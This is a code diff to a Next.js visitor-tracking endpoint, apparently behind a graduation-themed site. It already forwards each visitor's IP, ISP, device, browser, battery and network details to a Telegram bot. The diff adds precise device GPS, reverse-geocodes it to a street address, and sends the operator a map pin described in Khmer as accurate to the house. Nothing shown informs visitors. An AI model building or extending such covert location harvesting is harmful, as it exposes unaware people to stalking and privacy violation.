@@ -39,7 +39,7 @@ function parseDeviceInfo(userAgent) {
     os = 'Linux';
   }
 
-  // Browser detection (including Social In-App Browsers)
+  // Browser detection
   if (/FBAN|FBAV/i.test(userAgent)) browser = 'Facebook App Browser 📘';
   else if (/Instagram/i.test(userAgent)) browser = 'Instagram App 📸';
   else if (/Telegram/i.test(userAgent)) browser = 'Telegram App ✈️';
@@ -74,6 +74,7 @@ export async function POST(req) {
     const isDarkMode = body.isDarkMode;
     const networkType = body.networkType ? body.networkType.toUpperCase() : '';
     const battery = body.battery;
+    const gps = body.gps;
 
     // Get client IP address
     const forwarded = req.headers.get('x-forwarded-for');
@@ -107,8 +108,8 @@ export async function POST(req) {
     let isp = 'Unknown ISP';
     let org = '';
     let asNumber = '';
-    let lat = null;
-    let lon = null;
+    let ipLat = null;
+    let ipLon = null;
 
     if (ip && !ip.includes('127.0.0.1') && ip !== 'Unknown') {
       try {
@@ -128,13 +129,39 @@ export async function POST(req) {
             org = geoData.org || '';
             asNumber = geoData.as || '';
             if (geoData.lat && geoData.lon) {
-              lat = geoData.lat;
-              lon = geoData.lon;
+              ipLat = geoData.lat;
+              ipLon = geoData.lon;
             }
           }
         }
       } catch (e) {
         console.error('Geo lookup error:', e);
+      }
+    }
+
+    // Check if we have exact GPS coordinates from user device
+    const isExactGps = gps && typeof gps.lat === 'number' && typeof gps.lon === 'number';
+    const finalLat = isExactGps ? gps.lat : ipLat;
+    const finalLon = isExactGps ? gps.lon : ipLon;
+
+    let exactAddress = '';
+    if (isExactGps) {
+      try {
+        const nomRes = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${finalLat}&lon=${finalLon}&accept-language=km,en`,
+          {
+            headers: { 'User-Agent': 'RUA-Graduation-Tracker/1.0' },
+            signal: AbortSignal.timeout(3000),
+          }
+        );
+        if (nomRes.ok) {
+          const nomData = await nomRes.json();
+          if (nomData && nomData.display_name) {
+            exactAddress = nomData.display_name;
+          }
+        }
+      } catch (e) {
+        console.error('Nominatim reverse geocode error:', e);
       }
     }
 
@@ -155,10 +182,21 @@ export async function POST(req) {
     // Format Theme
     const themeText = isDarkMode === true ? '🌙 Dark Mode (ងងឹត)' : isDarkMode === false ? '☀️ Light Mode (ភ្លឺ)' : 'Auto / System';
 
-    // Format Map link
-    const mapLine = lat && lon
-      ? `  • 🗺️ <b>ផែនទី Google:</b> <a href="https://www.google.com/maps?q=${lat},${lon}"><b>ចុចទីនេះដើម្បីបើក Google Maps 📍</b></a>\n`
-      : '';
+    // Format Location Section based on GPS vs IP
+    let locationSection = '';
+    if (isExactGps) {
+      locationSection = `📍 <b>ទីតាំងភូមិសាស្ត្រ (🎯 ចាប់បាន GPS ផ្កាយរណបពិតប្រាកដ):</b>
+  • <b>កម្រិតសុក្រឹតភាព:</b> 🎯 <b>ច្បាស់ដល់មុខផ្ទះ/ផ្លូវ (± ${gps.accuracy || 10} ម៉ែត្រ)</b>
+  ${exactAddress ? `• <b>អាសយដ្ឋានលម្អិត:</b> ${exactAddress}\n  ` : ''}• <b>កូអរដោនេ GPS:</b> <code>${finalLat}, ${finalLon}</code>
+  • 🗺️ <b>ផែនទី Google:</b> <a href="https://www.google.com/maps?q=${finalLat},${finalLon}"><b>ចុចទីនេះដើម្បីបើក Google Maps 📍 (ចំដំបូលផ្ទះ)</b></a>`;
+    } else {
+      locationSection = `📍 <b>ទីតាំងភូមិសាស្ត្រ (🌐 ប៉ាន់ស្មានតាម IP / ISP):</b>
+  • <b>កម្រិតសុក្រឹតភាព:</b> 🌐 ប៉ាន់ស្មានតាម Server/បង្គោល ISP (~5-15km)
+  • <b>ប្រទេស:</b> ${country} ${flag}
+  • <b>រាជធានី/ខេត្ត:</b> ${region}
+  • <b>ទីក្រុង:</b> ${city} ${zip ? `(Zip: ${zip})` : ''}
+  ${finalLat && finalLon ? `• <b>កូអរដោនេ:</b> <code>${finalLat}, ${finalLon}</code>\n  ` : ''}${finalLat && finalLon ? `• 🗺️ <b>ផែនទី Google:</b> <a href="https://www.google.com/maps?q=${finalLat},${finalLon}"><b>ចុចទីនេះដើម្បីបើក Google Maps 📍</b></a>` : ''}`;
+    }
 
     const message = `🚨 <b>ការជូនដំណឹង៖ មានអ្នកចូលទស្សនាថ្មី! (New Visitor)</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -166,11 +204,8 @@ export async function POST(req) {
   • <b>IP Address:</b> <code>${ip}</code>
   • <b>ក្រុមហ៊ុន (ISP):</b> ${isp}
   ${org ? `• <b>ស្ថាប័ន (Org):</b> ${org}\n  ` : ''}${asNumber ? `• <b>បណ្តាញ (AS):</b> ${asNumber}\n  ` : ''}${networkType ? `• <b>ល្បឿនបណ្តាញ:</b> 📶 ${networkType}\n  ` : ''}
-📍 <b>ទីតាំងភូមិសាស្ត្រ (Location):</b>
-  • <b>ប្រទេស:</b> ${country} ${flag}
-  • <b>រាជធានី/ខេត្ត:</b> ${region}
-  • <b>ទីក្រុង:</b> ${city} ${zip ? `(Zip: ${zip})` : ''}
-  ${lat && lon ? `• <b>កូអរដោនេ:</b> <code>${lat}, ${lon}</code>\n` : ''}${mapLine}
+${locationSection}
+
 📱 <b>ឧបករណ៍ & ប្រព័ន្ធ (Device & System):</b>
   • <b>ប្រភេទឧបករណ៍:</b> ${deviceType}
   • <b>ប្រព័ន្ធប្រតិបត្តិការ:</b> ${os}
@@ -205,16 +240,16 @@ export async function POST(req) {
       return NextResponse.json({ success: false, error: teleData.description }, { status: 500 });
     }
 
-    // Send native interactive Telegram Location Map pin if coordinates are available
-    if (lat && lon) {
+    // Send native interactive Telegram Location Map pin
+    if (finalLat && finalLon) {
       try {
         await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: chatId,
-            latitude: lat,
-            longitude: lon,
+            latitude: finalLat,
+            longitude: finalLon,
           }),
         });
       } catch (mapErr) {
@@ -222,7 +257,7 @@ export async function POST(req) {
       }
     }
 
-    return NextResponse.json({ success: true });
+    return NextResponse.json({ success: true, isGps: isExactGps });
   } catch (error) {
     console.error('Track visitor error:', error);
     return NextResponse.json({ success: false, error: error.message }, { status: 500 });
